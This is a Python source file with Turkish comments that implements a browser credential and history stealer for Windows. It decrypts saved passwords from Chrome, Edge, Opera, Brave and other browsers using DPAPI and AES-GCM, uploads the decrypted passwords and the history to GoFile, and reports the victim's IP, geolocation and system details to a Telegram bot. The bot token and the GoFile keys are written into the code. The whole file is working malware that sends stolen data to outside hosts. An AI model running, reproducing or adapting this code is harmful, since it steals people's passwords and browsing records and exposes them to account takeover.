import os
import sqlite3
import shutil
import psutil
import platform
import requests
import json
import base64
import tempfile
import random
import string
from datetime import datetime, timedelta
from tempfile import gettempdir
from ctypes import Structure, c_ulong, c_char, POINTER, create_string_buffer, byref, windll
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Gofile API bilgileri
API = "CJOKylrPE5fGl6TrHUfkT92vgBkL2Q1q"
ACCOUNT_ID = "c5070904-ee4e-45d6-9786-df4eef21bd64"
FOLDER_ID = "af85d026-fd0b-43da-adb0-4312adb25259"

# Telegram Bot Token'ınızı ve Chat ID'nizi buraya ekleyin
TOKEN = '7459856337:AAHvmmMIPpaNr4McMlN_QvF74zmhtqFdf0A'
CHAT_ID = '1597757707'

# IP adresini öğrenmek için API
ip_api_url = 'https://api.ipify.org?format=json'

# IP adresi ile genel bilgi almak için API
apiKey = ''
ipapi_base_url = 'https://api.ipapi.is'

# Dosya yolları için sabitler
TEMP_DIR = gettempdir()

import os

def get_browser_paths(profile_name='Default'):
    """Tarayıcı dosya yollarını döndürür."""
    return {
        'Google': {
            'history': os.path.join(os.path.expanduser('~'), f'AppData/Local/Google/Chrome/User Data/{profile_name}/History'),
            'passwords': os.path.join(os.path.expanduser('~'), f'AppData/Local/Google/Chrome/User Data/{profile_name}/Login Data'),
            'local_state_path': os.path.join(os.path.expanduser('~'), 'AppData/Local/Google/Chrome/User Data/Local State')
        },
        'Edge': {
            'history': os.path.join(os.path.expanduser('~'), f'AppData/Local/Microsoft/Edge/User Data/{profile_name}/History'),
            'passwords': os.path.join(os.path.expanduser('~'), f'AppData/Local/Microsoft/Edge/User Data/{profile_name}/Login Data')
        },
        'Firefox': {
            'history': os.path.join(os.path.expanduser('~'), f'AppData/Roaming/Mozilla/Firefox/Profiles/{profile_name}/places.sqlite'),
            'passwords': os.path.join(os.path.expanduser('~'), f'AppData/Roaming/Mozilla/Firefox/Profiles/{profile_name}/logins.json')
        },
        'Opera': {
            'history': os.path.join(os.path.expanduser('~'), 'AppData/Roaming/Opera Software/Opera Stable/History'),
            'passwords': os.path.join(os.path.expanduser('~'), 'AppData/Roaming/Opera Software/Opera Stable/Login Data')
        },
        'Opera GX': {
            'history': os.path.join(os.path.expanduser('~'), 'AppData/Local/Opera Software/Opera GX Stable/History'),
            'passwords': os.path.join(os.path.expanduser('~'), 'AppData/Local/Opera Software/Opera GX Stable/Login Data')
        },
        'Brave': {
            'history': os.path.join(os.path.expanduser('~'), 'AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/History'),
            'passwords': os.path.join(os.path.expanduser('~'), 'AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data')
        }
    }

paths = get_browser_paths()  
for browser, path_dict in paths.items():
    print(f"{browser}:")
    for key, path in path_dict.items():
        print(f"  {key}: {path}")

# Şifreleme ve çözme işlemleri için sınıf ve fonksiyonlar
class DATA_BLOB(Structure):
    _fields_ = [("cbData", c_ulong), ("pbData", POINTER(c_char))]

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    """Şifrelenmiş veriyi çözer."""
    encrypted_bytes_buffer = create_string_buffer(encrypted_bytes)
    entropy_buffer = create_string_buffer(entropy)
    blob_in = DATA_BLOB(len(encrypted_bytes), encrypted_bytes_buffer)
    blob_entropy = DATA_BLOB(len(entropy), entropy_buffer)
    blob_out = DATA_BLOB()

    if not windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        error_code = windll.kernel32.GetLastError()
        error_message = create_string_buffer(1024)
        windll.kernel32.FormatMessageA(0x1000, None, error_code, 0, error_message, 1024, None)
        raise Exception(f"CryptUnprotectData çağrısı başarısız oldu. Hata kodu: {error_code}. Hata mesajı: {error_message.value.decode()}")
    else:
        decrypted_data = create_string_buffer(blob_out.cbData)
        windll.kernel32.RtlMoveMemory(decrypted_data, blob_out.pbData, blob_out.cbData)
    return decrypted_data.raw

def get_master_key(browser):
    """Tarayıcı master anahtarını alır."""
    paths = get_browser_paths()
    if browser in paths and 'local_state_path' in paths[browser]:
        local_state_path = paths[browser]['local_state_path']
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            master_key = master_key[5:]  # DPAPI başlığını kaldır
            return CryptUnprotectData(master_key)
        except Exception as e:
            return f'Dosya okunamadı: {e}'
    
    return None

def D3CrYP7V41U3(encrypted_bytes, master_key=None):
    """Şifrelenmiş byte veriyi çözer."""
    if master_key and (encrypted_bytes[:3] == b'v10' or encrypted_bytes[:3] == b'v11'):
        iv = encrypted_bytes[3:15]
        payload = encrypted_bytes[15:-16]
        tag = encrypted_bytes[-16:]
        
        cipher = Cipher(
            algorithms.AES(master_key),
            modes.GCM(iv, tag),
            backend=default_backend()
        )
        decryptor = cipher.decryptor()
        decrypted_pass = decryptor.update(payload) + decryptor.finalize()
        return decrypted_pass.decode()
    
    return encrypted_bytes


def generate_random_string(length=8):
    """Rastgele bir string üretir."""
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def upload_file_to_gofile(file_path):
    """Dosyayı GoFile.io'ya yükler ve yükleme işleminden sonra dosyayı siler."""
    print(f"Test edilen dosya yolu: {file_path}")
    if not os.path.exists(file_path):
        return f'Dosya mevcut değil: {file_path}'
    
    try:
        with open(file_path, 'rb') as file:
            response = requests.post(
                'https://api.gofile.io/upload',
                headers={'Authorization': API},
                files={'file': file},
                data={'folderId': FOLDER_ID, 'accountId': ACCOUNT_ID}
            )
        
        response_data = response.json()
        if response_data.get('status') == 'ok':
            download_link = response_data["data"]["downloadPage"]
            
            # Dosyayı yükleme işleminden sonra sil
            if os.path.exists(file_path):
                os.remove(file_path)
                print(f"Dosya silindi: {file_path}")
            else:
                return f"Dosya silinemedi: {file_path}"
            
            return download_link
        else:
            error_message = response_data.get('error', 'Bilinmeyen hata')
            return f"Dosya yüklenemedi: {error_message}"

    except requests.exceptions.RequestException as e:
        return f"HTTP hatası: {e}"
    except Exception as e:
        return f'Dosya yüklenemedi: {e}'

def extract_passwords(browser):
    """Tarayıcı şifrelerini çıkarır ve geçici dosyaya kaydeder."""
    paths = get_browser_paths()
    login_data_path = paths[browser].get('passwords')
    if not login_data_path:
        return None, f"{browser} şifre dosyası bulunamadı."

    temp_dir = tempfile.gettempdir()
    temp_login_data_path = os.path.join(temp_dir, 'LoginData_temp')
    output_path = os.path.join(temp_dir, f'{browser.lower()}_passwords.txt')

    if not os.path.exists(login_data_path):
        return None, f"{browser} şifre dosyası bulunamadı."

    try:
        shutil.copy2(login_data_path, temp_login_data_path)

        conn = sqlite3.connect(temp_login_data_path)
        cursor = conn.cursor()

        cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
        rows = cursor.fetchall()

        if not rows:
            return None, f"{browser}: Şifre bulunamadı."

        master_key = get_master_key(browser)
        if master_key is None:
            return None, f"{browser} için master anahtar alınamadı."

        with open(output_path, 'w', encoding='utf-8') as file:
            for row in rows:
                origin_url, action_url, username, encrypted_password = row
                try:
                    decrypted_password = D3CrYP7V41U3(encrypted_password, master_key)
                except Exception as e:
                    decrypted_password = f"Hata: {e}"

                file.write(f"URL: {origin_url}\nKullanıcı Adı: {username}\nŞifre: {decrypted_password}\n\n")

        conn.close()

        # GoFile'a yükleyip dosyayı sil
        upload_link = upload_file_to_gofile(output_path)

        return upload_link, None

    except Exception as e:
        return None, f"Şifreler okunamadı. Hata: {e}"


def extract_chrome_passwords():
    """Sadece Google Chrome şifrelerini çıkarır."""
    return extract_passwords('Google')

def get_external_ip():
    """Kullanıcının dış IP adresini alır."""
    response = requests.get(ip_api_url)
    if response.status_code == 200:
        return response.json().get('ip')
    else:
        return 'Bilgi alınamadı'

def get_ip_info(ip):
    """IP adresi bilgilerini alır."""
    ipapi_url = f'{ipapi_base_url}?q={ip}&key={apiKey}'
    response = requests.get(ipapi_url)
    if response.status_code == 200:
        data = response.json()
        ip_info = (
        f"**IP Adresi Bilgileri**\n"
        f"- 🌐 **IP Adresi**: {data.get('ip', 'Bilgi bulunamadı')}\n"
        f"- 🌍 **Şehir**: {data.get('location', {}).get('city', 'Bilgi bulunamadı')}\n"
        f"- 🏙️ **Bölge**: {data.get('location', {}).get('state', 'Bilgi bulunamadı')}\n"
        f"- 🇹🇷 **Ülke**: {data.get('location', {}).get('country', 'Bilgi bulunamadı')}\n"
        f"- 📍 **Coğrafi Koordinatlar**: {data.get('location', {}).get('latitude', 'Bilgi bulunamadı')}, {data.get('location', {}).get('longitude', 'Bilgi bulunamadı')}\n"
        f"- 🕒 **Yerel Saat**: {data.get('location', {}).get('local_time', 'Bilgi bulunamadı')}\n"
        f"- 🏢 **ISP**: {data.get('company', {}).get('name', 'Bilgi bulunamadı')}\n"
        f"- 🌐 **ASN**: {data.get('asn', {}).get('asn', 'Bilgi bulunamadı')}\n"
        )
        return ip_info
    else:
        return 'IP bilgileri alınamadı'

def get_system_info():
    """Cihaz bilgilerini toplar."""
    uname = platform.uname()
    cpu_info = psutil.cpu_percent(interval=1)
    ram_info = psutil.virtual_memory()
    system_info = (
    f"**Sistem Bilgileri**\n"
    f"- 💻 **Bilgisayar Adı**: {uname.node}\n"
    f"- 🖥️ **İşletim Sistemi**: {uname.system} {uname.release}\n"
    f"- 🧠 **İşlemci**: {uname.processor}\n"
    f"- ⚙️ **CPU Kullanımı**: {cpu_info}%\n"
    f"- 🧠 **RAM Kullanımı**: {ram_info.percent}% ({ram_info.available / (1024 ** 3):.2f} GB serbest)\n"
    )
    return system_info

def extract_browser_history(browser):
    """Tarayıcı geçmişini çeker ve geçici dosyaya kaydeder."""
    paths = get_browser_paths()
    history_db_path = paths.get(browser, {}).get('history')
    if not history_db_path or not os.path.exists(history_db_path):
        return None, f"{browser}: Tarayıcı bulunamadı veya geçmiş verisi mevcut değil."

    temp_dir = tempfile.gettempdir()
    temp_db_path = os.path.join(temp_dir, f'{browser}_History_copy')
    output_path = os.path.join(temp_dir, f'{browser}_history.txt')

    try:
        shutil.copy(history_db_path, temp_db_path)  # Kopyayı oluştur
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()

        cursor.execute("SELECT url, title, last_visit_time FROM urls")
        rows = cursor.fetchall()

        if not rows:
            return None, f"{browser}: Geçmiş verisi bulunamadı."

        with open(output_path, 'w', encoding='utf-8') as file:
            for row in rows:
                url = row[0]
                title = row[1]
                last_visit_time = datetime(1601, 1, 1) + timedelta(microseconds=(row[2] / 10))
                file.write(f"URL: {url}\nBaşlık: {title}\nSon Ziyaret Zamanı: {last_visit_time}\n\n")

        conn.close()

        # GoFile'a yükleyip dosyayı sil
        upload_link = upload_file_to_gofile(output_path)
        print(f"Yükleme linki: {upload_link}")  # Loglama için yazdır

        return upload_link, None

    except Exception as e:
        return None, f"{browser}: Tarayıcı geçmişi okunamadı. Hata: {e}"

def send_message_to_telegram(message):
    """Mesajı Telegram kanalına gönderir."""
    url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
    payload = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'  # Markdown formatında gönderir
    }

    response = requests.post(url, data=payload)

    if response.status_code == 200:
        print('Mesaj başarıyla gönderildi!')
    else:
        print(f'Bir hata oluştu. Status kodu: {response.status_code}')
        print(response.text)


    response = requests.post(url, data=payload)

def send_message_to_telegram(message):
    """Mesajı Telegram kanalına gönderir."""
    url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
    payload = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'  # Markdown formatında gönderir
    }

    response = requests.post(url, data=payload)

    if response.status_code == 200:
        print('Mesaj başarıyla gönderildi!')
    else:
        print(f'Bir hata oluştu. Status kodu: {response.status_code}')
        print(response.text)

if __name__ == "__main__":
    external_ip = get_external_ip()
    ip_info = get_ip_info(external_ip)
    system_info = get_system_info()

    history_links = []
    password_links = []

    for browser in get_browser_paths().keys():
        # Tarayıcı geçmişini çıkar
        history_file, history_error = extract_browser_history(browser)
        if history_file:
            history_links.append(f"{browser} geçmişi: {history_file}")
        elif history_error:
            history_links.append(f"{browser} geçmişi: {history_error}")

        # Tarayıcı şifrelerini çıkar
        password_file, password_error = extract_passwords(browser)
        if password_file:
            password_links.append(f"{browser} şifreleri: {password_file}")
        elif password_error:
            password_links.append(f"{browser} şifreleri: {password_error}")

    message = (
    "{}\n\n"
    "{}\n\n"
    "**Tarayıcı Geçmiş Dökümanları;**\n"
    "{}\n\n"
    "**Tarayıcı Şifreleri Dökümanları;**\n"
    "{}\n"
).format(
    system_info,
    ip_info,
    '\n'.join(history_links) if history_links else 'Tarayıcı geçmişi verisi yok.',
    '\n'.join(password_links) if password_links else 'Tarayıcı şifreleri verisi yok.'
)


    send_message_to_telegram(message)
